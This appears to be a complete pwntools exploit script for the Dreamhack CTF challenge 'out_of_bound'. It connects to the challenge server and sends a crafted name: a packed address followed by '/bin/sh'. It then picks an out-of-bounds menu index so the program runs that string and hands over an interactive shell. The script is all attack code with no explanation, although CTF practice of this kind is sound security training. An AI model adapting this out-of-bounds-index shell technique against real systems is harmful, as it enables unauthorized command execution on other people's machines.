from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./out_of_bound', checksec=False)

#r = process(exe.path)
r = remote('host3.dreamhack.games', 22019)
libc = exe.libc
#gdb.attach(r)
print(libc.address)
name = p32(0x804a0b0) + b'/bin/sh\x00'
r.sendlineafter(b'Admin name: ', name)
r.sendlineafter(b'What do you want?: ', b'19')
r.interactive()